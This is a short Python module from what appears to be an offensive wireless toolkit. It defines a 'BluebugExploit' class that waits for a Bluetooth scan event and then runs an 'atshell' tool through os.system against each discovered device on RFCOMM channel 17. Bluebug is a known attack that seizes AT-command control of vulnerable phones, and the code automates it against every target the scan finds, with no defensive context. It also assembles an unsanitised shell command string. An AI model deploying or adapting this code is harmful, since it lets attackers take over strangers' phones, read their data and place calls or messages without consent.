'''
Created on 05.09.2010

@author: basti
'''

from airxploit.scanner.bluetooth import BluetoothScanner
import airxploit.fuckup
import logging
import os

class BluebugExploit(object):

    EVENT = "BLUETOOTH_BLUEBUG_FOUND"
    SECTION = "bluebug"

    def __init__(self, pcc):
        self.__channel = 17 # TODO: this should be configurable via environment
        self.__pcc = pcc
        self.__pcc.registerEvent(BluebugExploit.EVENT)
        self.__pcc.registerForEvent(BluetoothScanner.EVENT, self)
        self.__pcc.registerService("SdpDiscovery", self)
        self.__result = []
    
    def run(self):
        for target in self.__pcc.readAllWithoutInfo(BluebugExploit.SECTION):
            logging.debug("Fireing bluebug exploit on target " + target.addr)
            os.system(self.__pcc.getTool("atshell") + " " + target.addr + " " + str(self.__channel) )

    def getResult(self):
        return self.__result
    
    def gotEvent(self, event):
        self.run()
